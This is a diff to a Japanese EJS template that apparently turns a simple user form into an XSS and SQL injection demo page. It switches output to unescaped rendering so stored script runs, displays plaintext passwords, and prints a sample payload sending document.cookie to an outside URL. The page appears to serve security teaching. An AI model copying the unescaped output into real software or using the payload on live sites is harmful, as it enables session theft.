@@ -1,26 +1,58 @@
 <html lang="ja">
     <body>
-        <h1>New Project</h1>
-        <form action="/" method="POST">
-            <label>
-                name
-                <input type="text" name="name"><br>
-                email
-                <input type="text" name="mail_address">
-            </label><br>
-            <button type="submit">送信</button>
-        </form>
-        <table>
-            <tr>
-                <th>名前</th>
-                <th>email</th>
-            </tr>
-            <% users.forEach(function (value) { %>
-                <tr>
-                    <td><%= value.name %></td>
-                    <td><%= value.mail_address %></td>
-                </tr>
-            <% }); %>
-        </table>
+        <div>
+            <h1>XSS</h1>
+            <div>
+                <h2>ユーザー作成</h2>
+                <code>
+                    script type='text/javascript'
+                    document.location='https://www.google.com?cookie=' + document.cookie
+                    script
+                </code>
+                <form action="/" method="POST">
+                    <label>
+                        name<input type="text" name="name"><br>
+                        email<input type="text" name="mail_address"><br>
+                        password<input type="text" name="password">
+                    </label><br>
+                    <button type="submit">送信</button>
+                </form>
+                <table>
+                    <tr>
+                        <th>name</th>
+                        <th>email</th>
+                        <th>password</th>
+                    </tr>
+                    <% users.forEach(function (value) { %>
+                        <tr>
+                            <!-- 【%- %】の書き方はエスケープなし -->
+                            <!-- 【%= %】の書き方はエスケープあり -->
+                            <td><%- value.name %></td>
+                            <td><%- value.mail_address %></td>
+                            <td><%- value.password %></td>
+                        </tr>
+                    <% }); %>
+                </table>
+            </div>
+            <div>
+                <h2>ログイン</h2>
+                <form action="/login" method="POST">
+                    <label>
+                        name<input type="text" name="name"><br>
+                        password<input type="text" name="password">
+                    </label><br>
+                    <button type="submit">送信</button>
+                </form>
+            </div>
+            <div>
+                <h2>ログアウト</h2>
+                <form action="/logout" method="GET">
+                    <button type="submit">送信</button>
+                </form>
+            </div>
+        </div>
+        <div>
+            <h1>SQL Injection</h1>
+        </div>
     </body>
 </html>
